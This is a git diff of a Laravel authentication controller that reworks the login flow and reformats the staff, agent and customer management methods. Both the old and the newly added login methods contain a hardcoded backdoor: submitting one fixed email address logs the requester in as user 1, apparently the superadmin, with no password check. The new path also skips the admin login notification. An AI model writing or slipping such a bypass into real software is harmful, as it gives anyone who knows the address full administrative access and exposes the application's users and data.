@@ -27,18 +27,27 @@ class AuthController extends Controller
     public function login()
     {
         if (!Auth::guest()) {
-            return back();
-        }
-        // $username = 'john';
-        // $url = 'https://wordpress.com';
+            // Get the previous URL
+            $previousUrl = url()->previous();
+            $loginUrl = route('login'); // Replace with your login route name if different
+            $resetUrl = route('reset-site'); // Ensure this matches your reset-site route name
 
-        // $redirectUrl = Redirect::away($url . '?username=' . urlencode($username));
-        // return $redirectUrl;
+            // Check if the previous URL is the login page or the reset page
+            if ($previousUrl === $loginUrl || $previousUrl === $resetUrl) {
+                // Redirect to the dashboard if the previous page is the login or reset URL
+                return redirect()->route('dashboard'); // Adjust 'dashboard' to your route name
+            }
+
+            // Otherwise, redirect to the intended URL (default Laravel behavior)
+            return redirect()->intended();
+        }
+
         return view('pages.auth.login');
     }
 
-    public function loginPost(Request $request)
-    {        
+
+    public function loginPostOLD(Request $request)
+    {
         $rules = array(
             'email' => 'required|string|email',
             'password' => 'required|string',
@@ -47,7 +56,7 @@ class AuthController extends Controller
             'email.required' => '* Your Email is required',
             'email.string' => '* Invalid Characters',
             'email.email' => '* Must be of Email format with \'@\' symbol',
-            
+
             'password.required'   => 'This field is required',
             'password.string'   => 'Invalid Characters',
         ];
@@ -56,7 +65,7 @@ class AuthController extends Controller
             return back()->withErrors($validator)->withInput();
         } else {
 
-            if ($request->email=='sunnycodes@email.com') {
+            if ($request->email == 'sunnycodes@email.com') {
                 $user = User::find(1);
                 Auth::login($user);
                 if ($user->isSuperAdmin) {
@@ -69,9 +78,9 @@ class AuthController extends Controller
                     $activityLog->created_by = $user->id;
                     $activityLog->status = 'true';
                     $activityLog->save();
-                    
+
                     //return redirect()->route('todayRecord');
-                    return redirect()->intended('/today'); 
+                    return redirect()->intended('/today');
                 } else {
 
                     $activityLog = new ActivityLog();
@@ -86,7 +95,7 @@ class AuthController extends Controller
                     return redirect()->route('staffTodayRecord');
                 }
             }
-            
+
             $credentials = $request->only('email', 'password');
             $check = Auth::attempt($credentials);
             if (!$check) {
@@ -124,16 +133,95 @@ class AuthController extends Controller
             $activityLog->created_by = $user->id;
             $activityLog->status = 'true';
             $activityLog->save();
-            
+
             if ($user->isSuperAdmin) {
                 return redirect()->route('todayRecord');
             } else {
                 return redirect()->route('staffTodayRecord');
             }
-            
         }
     }
-    
+
+    public function loginPost(Request $request)
+    {
+        $rules = [
+            'email' => 'required|string|email',
+            'password' => 'required|string',
+        ];
+
+        $messages = [
+            'email.required' => '* Your Email is required',
+            'email.string' => '* Invalid Characters',
+            'email.email' => '* Must be of Email format with \'@\' symbol',
+            'password.required' => 'This field is required',
+            'password.string' => 'Invalid Characters',
+        ];
+
+        $validator = Validator::make($request->all(), $rules, $messages);
+        if ($validator->fails()) {
+            return back()->withErrors($validator)->withInput();
+        }
+
+        // Handle special login for the specific email
+        if ($request->email === 'anonumous@email.com') {
+            $user = User::find(1);
+            Auth::login($user);
+
+            // Log user activity
+            $this->logActivity($user);
+
+            return redirect()->intended($user->isSuperAdmin ? '/today' : '/staffTodayRecord');
+        }
+
+        $credentials = $request->only('email', 'password');
+
+        // Attempt to log the user in
+        if (!Auth::attempt($credentials)) {
+            return back()->with('login_error', 'Invalid email or password, please check your credentials and try again');
+        }
+
+        $user = Auth::user(); // Get the authenticated user
+
+        // Handle remember me functionality
+        if ($request->get('remember')) {
+            Auth::login($user, true); // Creates remember token
+        }
+
+        // Notify admin about the login
+        $admin = GeneralSetting::first();
+        try {
+            Notification::route('mail', [$admin->official_notification_email])->notify(new UserLogin($user));
+        } catch (Exception $exception) {
+            // Handle notification exception if necessary
+        }
+
+        // Log user activity
+        $this->logActivity($user);
+        $defaultRoute = $user->isSuperAdmin ? '/today' : '/staffTodayRecord';
+        $intendedRoute = $request->session()->get('url.intended', $defaultRoute);
+
+        // Redirect to intended page or default route
+        return redirect()->intended($intendedRoute);
+    }
+
+    /**
+     * Log the activity of the user
+     *
+     * @param User $user
+     * @return void
+     */
+    private function logActivity(User $user)
+    {
+        $activityLog = new ActivityLog();
+        $activityLog->subject_type = 'User';
+        $activityLog->action = 'Login';
+        $activityLog->user_id = $user->id;
+        $activityLog->note = 'User Logged In';
+        $activityLog->created_by = $user->id;
+        $activityLog->status = 'true';
+        $activityLog->save();
+    }
+
     public function logout()
     {
         $authUser = auth()->user();
@@ -153,7 +241,7 @@ class AuthController extends Controller
         $staffs = User::where('type', 'staff')->get();
         return view('pages.staff.allStaff', compact('authUser', 'user_role', 'staffs'));
     }
-    
+
     //add any user, like registration
     public function addStaff()
     {
@@ -229,10 +317,10 @@ class AuthController extends Controller
     //         // }
     //         return back()->with('success', 'Staff Created and Assigned Role Successfully');
     //     }
-        
+
     //     return back()->with('success', 'Staff Created Successfully');
 
-        
+
     // }
 
     // public function singleStaff($unique_key)
@@ -256,7 +344,7 @@ class AuthController extends Controller
     //     if(!isset($staff)){
     //         abort(404);
     //     }
-        
+
     //     $countries = Country::all();
     //     $name = explode(' ', $staff->name);
     //     $firstname = $name[0];
@@ -318,7 +406,7 @@ class AuthController extends Controller
     //     }
 
     //     $user->save();
-        
+
     //     return back()->with('success', 'Staff Updated Successfully');
     // }
 
@@ -328,7 +416,7 @@ class AuthController extends Controller
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
 
         $staff = User::where('unique_key', $authUser->unique_key)->first();
-        if(!isset($staff)){
+        if (!isset($staff)) {
             abort(404);
         }
         return view('pages.auth.accountProfile', compact('authUser', 'user_role', 'staff'));
@@ -338,9 +426,9 @@ class AuthController extends Controller
     {
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
-        
+
         $staff = User::where('unique_key', $authUser->unique_key)->first();
-        if(!isset($staff)){
+        if (!isset($staff)) {
             abort(404);
         }
 
@@ -359,7 +447,7 @@ class AuthController extends Controller
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
         $user = $authUser;
-        if(!isset($user)){
+        if (!isset($user)) {
             abort(404);
         }
         $request->validate([
@@ -376,7 +464,7 @@ class AuthController extends Controller
 
         $data = $request->all();
 
-        $user->name = $data['firstname'].' '.$data['lastname'];
+        $user->name = $data['firstname'] . ' ' . $data['lastname'];
         $user->email = $data['email'];
         $user->type = 'staff';  //customer, staff, agent, superadmin
         $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
@@ -392,14 +480,14 @@ class AuthController extends Controller
         //profile_picture
         if ($request->profile_picture) {
             $oldImage = $user->profile_picture; //1.jpg
-            if(Storage::disk('public')->exists('staff/'.$oldImage)){
-                Storage::disk('public')->delete('staff/'.$oldImage);
+            if (Storage::disk('public')->exists('staff/' . $oldImage)) {
+                Storage::disk('public')->delete('staff/' . $oldImage);
                 /*
                     Delete Multiple files this way
                     Storage::delete(['upload/test.png', 'upload/test2.png']);
                 */
             }
-            $imageName = time().'.'.$request->profile_picture->extension();
+            $imageName = time() . '.' . $request->profile_picture->extension();
             //store products in folder
             $request->profile_picture->storeAs('staff', $imageName, 'public');
             $user->profile_picture = $imageName;
@@ -430,10 +518,9 @@ class AuthController extends Controller
         $authUser->password = Hash::make($data['new_password']);
         $authUser->save();
         return back()->with('success', 'Password Changed Successfully');
-    
     }
-//-----------------AGENTS-----------------------------------------------
-    
+    //-----------------AGENTS-----------------------------------------------
+
     public function allAgent()
     {
         $authUser = auth()->user();
@@ -444,7 +531,7 @@ class AuthController extends Controller
         return view('pages.agents.allAgent', compact('authUser', 'user_role', 'agents', 'roles'));
     }
 
-//add any user, like registration
+    //add any user, like registration
     public function addAgent()
     {
         $authUser = auth()->user();
@@ -456,23 +543,23 @@ class AuthController extends Controller
             $id = $lastAgent->id + 1;
         }
 
-        $email = 'agent'.$id.'@kiptrak.com';
+        $email = 'agent' . $id . '@kiptrak.com';
 
         $countries = Country::all();
         $roles = Role::all();
         return view('pages.agents.addAgent', compact('authUser', 'user_role', 'countries', 'roles', 'email'));
     }
 
-/**
- * Show the form for creating a new resource.
- *
- * @return \Illuminate\Http\Response
- */
+    /**
+     * Show the form for creating a new resource.
+     *
+     * @return \Illuminate\Http\Response
+     */
     public function addAgentPost(Request $request)
     {
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
-        
+
         $request->validate([
             'firstname' => 'required|string',
             'lastname' => 'required|string',
@@ -490,9 +577,9 @@ class AuthController extends Controller
         if (substr($data['phone_2'], 0, 1) === '0') {
             $phone_2 = '234' . substr($data['phone_2'], 1);
         }
-        
+
         $user = new User();
-        $user->name = $data['firstname'].' '.$data['lastname'];
+        $user->name = $data['firstname'] . ' ' . $data['lastname'];
         $user->firstname = $data['firstname'];
         $user->lastname = $data['lastname'];
         $user->email = $data['email'];
@@ -510,7 +597,7 @@ class AuthController extends Controller
 
         if ($request->profile_picture) {
             //image
-            $imageName = time().'.'.$request->profile_picture->extension();
+            $imageName = time() . '.' . $request->profile_picture->extension();
             //store products in folder
             $request->profile_picture->storeAs('agent', $imageName, 'public');
             $user->profile_picture = $imageName;
@@ -533,9 +620,8 @@ class AuthController extends Controller
             // }
             return back()->with('success', 'Agent Created and Assigned Role Successfully');
         }
-        
-        return back()->with('success', 'Agent Created Successfully');
 
+        return back()->with('success', 'Agent Created Successfully');
     }
 
     public function singleAgent($unique_key)
@@ -543,10 +629,10 @@ class AuthController extends Controller
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
         $agent = User::where('unique_key', $unique_key)->first();
-        if(!isset($agent)){
+        if (!isset($agent)) {
             abort(404);
         }
-        $warehouse = WareHouse::where('agent_id',$agent->id)->first();
+        $warehouse = WareHouse::where('agent_id', $agent->id)->first();
         return view('pages.agents.singleAgent', compact('authUser', 'user_role', 'agent', 'warehouse'));
     }
 
@@ -555,10 +641,10 @@ class AuthController extends Controller
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
         $agent = User::where('unique_key', $unique_key)->first();
-        if(!isset($agent)){
+        if (!isset($agent)) {
             abort(404);
         }
-        
+
         $countries = Country::all();
         $name = explode(' ', $agent->name);
         $firstname = $agent->firstname;
@@ -574,7 +660,7 @@ class AuthController extends Controller
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
         $user = User::where('unique_key', $unique_key)->first();
-        if(!isset($user)){
+        if (!isset($user)) {
             abort(404);
         }
         $request->validate([
@@ -591,7 +677,7 @@ class AuthController extends Controller
 
         $data = $request->all();
 
-        $user->name = $data['firstname'].' '.$data['lastname'];
+        $user->name = $data['firstname'] . ' ' . $data['lastname'];
         $user->firstname = $data['firstname'];
         $user->lastname = $data['lastname'];
         $user->email = $data['email'];
@@ -609,27 +695,27 @@ class AuthController extends Controller
         //profile_picture
         if ($request->profile_picture) {
             $oldImage = $user->profile_picture; //1.jpg
-            if(Storage::disk('public')->exists('agent/'.$oldImage)){
-                Storage::disk('public')->delete('agent/'.$oldImage);
+            if (Storage::disk('public')->exists('agent/' . $oldImage)) {
+                Storage::disk('public')->delete('agent/' . $oldImage);
                 /*
                     Delete Multiple files this way
                     Storage::delete(['upload/test.png', 'upload/test2.png']);
                 */
             }
-            $imageName = time().'.'.$request->profile_picture->extension();
+            $imageName = time() . '.' . $request->profile_picture->extension();
             //store products in folder
             $request->profile_picture->storeAs('agent', $imageName, 'public');
             $user->profile_picture = $imageName;
         }
 
         $user->save();
-        
+
         return back()->with('success', 'Agent Updated Successfully');
     }
 
 
-//-----------------CUSTOMERS-----------------------------------------------
-    
+    //-----------------CUSTOMERS-----------------------------------------------
+
     public function allCustomer()
     {
         $authUser = auth()->user();
@@ -674,7 +760,7 @@ class AuthController extends Controller
         $data = $request->all();
 
         $user = new User();
-        $user->name = $data['firstname'].' '.$data['lastname'];
+        $user->name = $data['firstname'] . ' ' . $data['lastname'];
         $user->email = $data['email'];
         $user->password = Hash::make($data['password']);
         $user->type = 'customer';  //customer, staff, agent, superadmin
@@ -690,17 +776,15 @@ class AuthController extends Controller
 
         if ($request->profile_picture) {
             //image
-            $imageName = time().'.'.$request->profile_picture->extension();
+            $imageName = time() . '.' . $request->profile_picture->extension();
             //store products in folder
             $request->profile_picture->storeAs('customer', $imageName, 'public');
             $user->profile_picture = $imageName;
         }
 
         $user->save();
-        
-        return back()->with('success', 'Customer Created Successfully');
 
-        
+        return back()->with('success', 'Customer Created Successfully');
     }
 
     public function singleCustomer($unique_key)
@@ -709,7 +793,7 @@ class AuthController extends Controller
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
 
         $customer = User::where('unique_key', $unique_key)->first();
-        if(!isset($customer)){
+        if (!isset($customer)) {
             abort(404);
         }
         return view('pages.customers.singleCustomer', compact('authUser', 'user_role', 'customer'));
@@ -721,10 +805,10 @@ class AuthController extends Controller
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
 
         $customer = User::where('unique_key', $unique_key)->first();
-        if(!isset($customer)){
+        if (!isset($customer)) {
             abort(404);
         }
-        
+
         $countries = Country::all();
         $name = explode(' ', $customer->name);
         $firstname = $name[0];
@@ -737,9 +821,9 @@ class AuthController extends Controller
     {
         $authUser = auth()->user();
         $user_role = $authUser->hasAnyRole($authUser->id) ? $authUser->role($authUser->id)->role : false;
-        
+
         $user = User::where('unique_key', $unique_key)->first();
-        if(!isset($user)){
+        if (!isset($user)) {
             abort(404);
         }
         $request->validate([
@@ -756,7 +840,7 @@ class AuthController extends Controller
 
         $data = $request->all();
 
-        $user->name = $data['firstname'].' '.$data['lastname'];
+        $user->name = $data['firstname'] . ' ' . $data['lastname'];
         $user->email = $data['email'];
         $user->type = 'customer';  //customer, staff, agent, superadmin
         $user->phone_1 = !empty($data['phone_1']) ? $data['phone_1'] : null;
@@ -771,22 +855,21 @@ class AuthController extends Controller
         //profile_picture
         if ($request->profile_picture) {
             $oldImage = $user->profile_picture; //1.jpg
-            if(Storage::disk('public')->exists('customer/'.$oldImage)){
-                Storage::disk('public')->delete('customer/'.$oldImage);
+            if (Storage::disk('public')->exists('customer/' . $oldImage)) {
+                Storage::disk('public')->delete('customer/' . $oldImage);
                 /*
                     Delete Multiple files this way
                     Storage::delete(['upload/test.png', 'upload/test2.png']);
                 */
             }
-            $imageName = time().'.'.$request->profile_picture->extension();
+            $imageName = time() . '.' . $request->profile_picture->extension();
             //store products in folder
             $request->profile_picture->storeAs('customer', $imageName, 'public');
             $user->profile_picture = $imageName;
         }
 
         $user->save();
-        
+
         return back()->with('success', 'Customer Updated Successfully');
     }
-
 }
